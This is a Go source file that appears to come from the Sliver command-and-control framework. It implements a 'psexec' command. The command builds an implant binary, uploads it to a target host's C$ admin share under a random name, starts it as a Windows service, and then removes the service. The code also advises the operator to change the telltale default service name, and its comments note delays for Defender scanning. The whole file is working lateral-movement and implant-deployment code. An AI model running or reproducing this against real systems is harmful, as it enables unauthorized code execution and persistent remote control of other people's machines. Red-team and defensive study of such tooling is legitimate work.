package command

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/desertbit/grumble"
)

func psExec(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		fmt.Printf(Warn + "Please select an active session via `use`")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Println(Warn + "you need to provide a target host, see `help psexec` for examples")
		return
	}

	hostname := ctx.Args[0]

	profile := ctx.Flags.String("profile")
	serviceName := ctx.Flags.String("service-name")
	serviceDesc := ctx.Flags.String("service-description")
	binPath := ctx.Flags.String("binpath")
	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))

	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
		fmt.Printf(Warn+"Warning: you're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
		fmt.Println(Warn + "You might want to change that before going further...")
		if !isUserAnAdult() {
			return
		}
	}

	if profile == "" {
		fmt.Println(Warn + "you need to pass a profile name, see `help psexec` for more info")
		return
	}

	// generate sliver
	generateCtrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
	profiles, err := rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	generateCtrl <- true
	<-generateCtrl
	var p *clientpb.ImplantProfile
	for _, prof := range profiles.Profiles {
		if prof.Name == profile {
			p = prof
		}
	}
	if p.GetName() == "" {
		fmt.Printf(Warn+"no profile found for name %s\n", profile)
		return
	}
	sliverBinary, err := getSliverBinary(p, rpc)
	filename := randomString(10)
	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
	uploadGzip := new(encoders.Gzip).Encode(sliverBinary)
	// upload to remote target
	uploadCtrl := make(chan bool)
	go spin.Until("Uploading service binary ...", uploadCtrl)
	upload, err := rpc.Upload(context.Background(), &sliverpb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    filePath,
		Request: ActiveSession.Request(ctx),
	})
	uploadCtrl <- true
	<-uploadCtrl
	if err != nil {
		fmt.Printf(Warn+"Error: %s\n", err)
		return
	}
	fmt.Printf(Info+"Uploaded service binary to %s\n", upload.GetPath())
	fmt.Println(Info + "Waiting a bit for the file to be analyzed ...")
	// Looks like starting the service right away often fails
	// because a process is already using the binary.
	// I suspect that Defender on my lab is holding access
	// while scanning, which often resulted in an error.
	// Waiting 5 seconds seem to do the trick here.
	time.Sleep(5 * time.Second)
	// start service
	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
	serviceCtrl := make(chan bool)
	go spin.Until("Starting service ...", serviceCtrl)
	start, err := rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
		BinPath:            binaryPath,
		Hostname:           hostname,
		Request:            ActiveSession.Request(ctx),
		ServiceDescription: serviceDesc,
		ServiceName:        serviceName,
		Arguments:          "",
	})
	serviceCtrl <- true
	<-serviceCtrl
	if err != nil {
		fmt.Printf(Warn+"Error: %v\n", err)
		return
	}
	if start.Response != nil && start.Response.Err != "" {
		fmt.Printf(Warn+"Error: %s", start.Response.Err)
		return
	}
	fmt.Printf(Info+"Successfully started service on %s (%s)\n", hostname, binaryPath)
	removeChan := make(chan bool)
	go spin.Until("Removing service ...", removeChan)
	removed, err := rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{
			Hostname:    hostname,
			ServiceName: serviceName,
		},
		Request: ActiveSession.Request(ctx),
	})
	removeChan <- true
	<-removeChan
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}
	if removed.Response != nil && removed.Response.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", removed.Response.Err)
		return
	}
	fmt.Printf(Info+"Successfully removed service %s on %s\n", serviceName, hostname)
}

func randomString(length int) string {
	var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(b)
}
